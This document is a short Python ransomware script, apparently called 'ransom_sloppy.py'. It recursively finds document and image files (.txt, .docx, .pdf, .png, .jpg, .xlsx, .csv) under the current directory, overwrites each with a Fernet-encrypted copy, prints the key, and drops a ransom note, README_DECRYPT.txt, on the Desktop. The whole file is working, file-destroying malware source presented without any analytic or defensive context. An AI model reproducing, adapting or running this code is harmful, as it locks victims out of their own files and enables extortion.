#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# ext to hit
exts = ['.txt','.docx','.pdf','.png','.jpg','.xlsx','.csv']

# skips
skip = ['ransom_sloppy.py','README_DECRYPT.txt']

# make key
key = Fernet.generate_key()
print("SAVE THIS OR LOSE EVERYTHING:")
print(key.decode())
f = Fernet(key)

# find files
files = []
for root, dirs, filenames in os.walk("."):
	for name in filenames:
		if name in skip:
			continue
		if any(name.lower().endswith(x) for x in exts):
			files.append(os.path.join(root, name))

print("encrypting", len(files), "files...")

# encrypt all
for file in files:
	try:
		with open(file, 'rb') as r:
			data = r.read()
		data = f.encrypt(data)
		with open(file, 'wb') as w:
			w.write(data)
		print("locked", file)
	except:
		print("couldnt lock", file)

# ransom msg
note = """
YOUR STUFF IS LOCKED

PLEASE READ "README,MD" IF YOU NEED HELP
"""

# put note on desktop
desk = os.path.expanduser("~/Desktop")
try:
	with open(os.path.join(desk, "README_DECRYPT.txt"), "w") as r:
		r.write(note)
	print("note dropped on desktop")
except:
	print("couldn't drop ransom note")

print("done.")

